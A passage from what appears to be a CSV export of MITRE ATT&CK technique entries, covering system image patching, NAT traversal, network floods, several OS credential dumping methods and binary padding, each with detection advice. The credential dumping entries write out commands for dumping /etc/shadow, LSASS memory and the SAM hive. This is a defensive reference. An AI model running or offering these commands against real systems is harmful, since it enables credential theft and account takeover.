Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. 

When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). 

When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ",https://attack.mitre.org/techniques/T1601/001,19 October 2020,22 October 2020,enterprise-attack,1.0,Defense Evasion,"Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)

Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)",Network,File: File Modification,True,T1601,,,Administrator,,,,,"(Citation: Cisco Synful Knock Evolution),(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: NIST 800-63-3)"
T1599.001,attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de,Network Boundary Bridging: Network Address Translation Traversal,"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)

When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  

Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",https://attack.mitre.org/techniques/T1599/001,19 October 2020,21 October 2020,enterprise-attack,1.0,Defense Evasion,"Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.

Monitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.",Network,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1599,,,Administrator,,,,,",(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: NIST 800-63-3)"
T1498.001,attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3,Network Denial of Service: Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",https://attack.mitre.org/techniques/T1498/001,02 March 2020,30 March 2023,enterprise-attack,1.3,Impact,"Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1498,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1498.002,attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01,Network Denial of Service: Reflection Amplification,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.

Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",https://attack.mitre.org/techniques/T1498/002,02 March 2020,30 March 2023,enterprise-attack,1.3,Impact,"Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Network Traffic: Network Traffic Flow, Sensor Health: Host Status",True,T1498,,,,,,Availability,,",(Citation: CERT-EU DDoS March 2017)"
T1003.008,attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4,OS Credential Dumping: /etc/passwd and /etc/shadow,"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)

The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
",https://attack.mitre.org/techniques/T1003/008,11 February 2020,20 March 2020,enterprise-attack,1.0,Credential Access,"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.",Linux,"Command: Command Execution, File: File Access",True,T1003,,,root,,,,,"(Citation: GitHub LaZagne Dec 2018),"
T1003.005,attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530,OS Credential Dumping: Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)

On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)

With SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.

Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",https://attack.mitre.org/techniques/T1003/005,21 February 2020,19 October 2023,enterprise-attack,1.0,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",Windows,Command: Command Execution,True,T1003,,"Ed Williams, Trustwave, SpiderLabs",,,,,,"(Citation: Unit 42 MuddyWater Nov 2017),(Citation: ESET Okrum July 2019),(Citation: FireEye APT34 July 2019),(Citation: Symantec Elfin Mar 2019),(Citation: Symantec Leafminer July 2018),(Citation: Mandiant APT1),(Citation: Symantec MuddyWater Dec 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: GitHub LaZagne Dec 2018),(Citation: GitHub Pupy),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT35 2018),(Citation: Microsoft Protected Users Security Group),(Citation: Tilbury Windows Credentials)"
T1003.006,attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163,OS Credential Dumping: DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.

Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)

DCSync functionality has been included in the ""lsadump"" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",https://attack.mitre.org/techniques/T1003/006,11 February 2020,22 April 2021,enterprise-attack,1.0,Credential Access,"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)

Note: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",Windows,"Active Directory: Active Directory Object Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1003,,ExtraHop; Vincent Le Toux,Administrator,,,,,"(Citation: Deply Mimikatz),(Citation: FoxIT Wocao December 2019),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: GitHub Mimikatz lsadump Module),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Microsoft 365 Defender Solorigate),(Citation: NCSC Joint Report Public Tools),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Microsoft Replication ACL),(Citation: ADSecurity Mimikatz DCSync)"
T1003.004,attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc,OS Credential Dumping: LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",https://attack.mitre.org/techniques/T1003/004,21 February 2020,21 April 2021,enterprise-attack,1.0,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",Windows,"Command: Command Execution, Windows Registry: Windows Registry Key Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs",SYSTEM,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: F-Secure The Dukes),(Citation: AADInternals Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub LaZagne Dec 2018),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: NCC Group APT15 Alive and Strong),(Citation: CME Github September 2018),(Citation: Core Security Impacket),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Symantec Leafminer July 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Impacket Tools),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Deply Mimikatz),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: TrueSec Gsecdump),(Citation: GitHub Mimikatz lsadump Module),(Citation: Github AD-Pentest-Script),(Citation: NCSC Joint Report Public Tools),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: US-CERT TA18-074A),(Citation: FireEye APT34 July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Dell TG-3390),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub Pupy),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT35 2018),(Citation: Tilbury Windows Credentials)"
T1003.001,attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90,OS Credential Dumping: LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as comsvcs.dll can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)


Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
",https://attack.mitre.org/techniques/T1003/001,11 February 2020,24 July 2023,enterprise-attack,1.3,Credential Access,"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",Windows,"Command: Command Execution, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1003,,"Ed Williams, Trustwave, SpiderLabs; Edward Millington; Olaf Hartong, Falcon Force",,,,,,"(Citation: Trend Micro Muddy Water March 2021),(Citation: Cylance Cleaver),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec Whitefly March 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Impacket Tools),(Citation: TrendMicro EarthLusca 2022),(Citation: CISA AA20-301A Kimsuky),(Citation: NCSC Joint Report Public Tools),(Citation: Volexity Exchange Marauder March 2021),(Citation: Github PowerShell Empire),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye APT33 Guardrail),(Citation: Dragos Crashoverride 2018),(Citation: GitHub LaZagne Dec 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye APT41 Aug 2019),(Citation: Threatpost Lizar May 2021),(Citation: GitHub PoshC2),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET Okrum July 2019),(Citation: FireEye FIN6 Apr 2019),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: GitHub Mimikatz lsadump Module),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Mandiant FIN13 Aug 2022),(Citation: Talos PoetRAT April 2020),(Citation: Unit42 OilRig Playbook 2023),(Citation: Group IB APT 41 June 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Mandiant APT1),(Citation: Symantec Elfin Mar 2019),(Citation: F-Secure CozyDuke),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Talos Nyetya June 2017),(Citation: NCC Group APT15 Alive and Strong),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: PowerSploit Documentation),(Citation: Symantec Leafminer July 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Deply Mimikatz),(Citation: Cybereason Oceanlotus May 2017),(Citation: Group IB Silence Sept 2018),(Citation: ESET Sednit Part 2),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: KISA Operation Muzabi),(Citation: Talos Olympic Destroyer 2018),(Citation: FireEye APT40 March 2019),(Citation: FireEye FIN6 April 2016),(Citation: Microsoft NICKEL December 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: BiZone Lizar May 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Symantec Buckeye),(Citation: GitHub PowerSploit May 2012),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye APT39 Jan 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Amplia WCE),(Citation: ESET Telebots June 2017),(Citation: Symantec Tick Apr 2016),(Citation: FireEye TRITON 2019),(Citation: ESET Telebots Dec 2016),(Citation: US-CERT NotPetya 2017),(Citation: FireEye APT34 July 2019),(Citation: DFIR Phosphorus November 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Dell TG-3390),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Bad Rabbit),(Citation: GitHub Pupy),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Microsoft Volt Typhoon May 2023),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT35 2018),(Citation: GitHub SHB Credential Guard),(Citation: Microsoft LSA),(Citation: win10_asr),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: TechNet Credential Guard),(Citation: Microsoft WDigest Mit)"
T1003.003,attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24,OS Credential Dumping: NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
",https://attack.mitre.org/techniques/T1003/003,11 February 2020,28 July 2023,enterprise-attack,1.2,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.",Windows,"Command: Command Execution, File: File Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs",,,Access to Domain Controller or backup,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Cary Esentutl),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Cycraft Chimera April 2020),(Citation: Core Security Impacket),(Citation: FireEye FIN6 Apr 2019),(Citation: CME Github September 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: Impacket Tools),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Github Koadic),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: Volexity Exchange Marauder March 2021),(Citation: US-CERT TA18-074A),(Citation: Symantec Cicada November 2020),(Citation: FireEye FIN6 April 2016),(Citation: Microsoft NICKEL December 2021),(Citation: LOLBAS Esentutl),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: Metcalf 2015)"
T1003.007,attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d,OS Credential Dumping: Proc Filesystem,"Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)

When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)

If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",https://attack.mitre.org/techniques/T1003/007,11 February 2020,15 April 2023,enterprise-attack,1.1,Credential Access,"To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\*/maps</code>, where the <code>\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",Linux,"Command: Command Execution, File: File Access",True,T1003,,Tim (Wadhwa-)Brown,,,,,,"(Citation: GitHub LaZagne Dec 2018),(Citation: Picus Labs Proc cump 2022),(Citation: MimiPenguin GitHub May 2017),"
T1003.002,attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011,OS Credential Dumping: Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)

Notes: 

* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.
",https://attack.mitre.org/techniques/T1003/002,11 February 2020,24 July 2023,enterprise-attack,1.1,Credential Access,Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.,Windows,"Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs; Olaf Hartong, Falcon Force",,,,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: Symantec Backdoor.Mivast),(Citation: F-Secure The Dukes),(Citation: Mandiant APT1),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: F-Secure CozyDuke),(Citation: NCC Group APT15 Alive and Strong),(Citation: CME Github September 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Impacket Tools),(Citation: Cybereason Soft Cell June 2019),(Citation: Deply Mimikatz),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: TrueSec Gsecdump),(Citation: GitHub Mimikatz lsadump Module),(Citation: Mandiant APT41),(Citation: Github AD-Pentest-Script),(Citation: Github Koadic),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: NCSC Joint Report Public Tools),(Citation: US-CERT TA18-074A),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Dell TG-3390),(Citation: cobaltstrike manual),(Citation: McAfee Night Dragon),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: FireEye APT33 Guardrail),(Citation: Wikipedia pwdump),(Citation: Microsoft Disable NTLM Nov 2012)"
T1027.001,attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5,Obfuscated Files or Information: Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. 

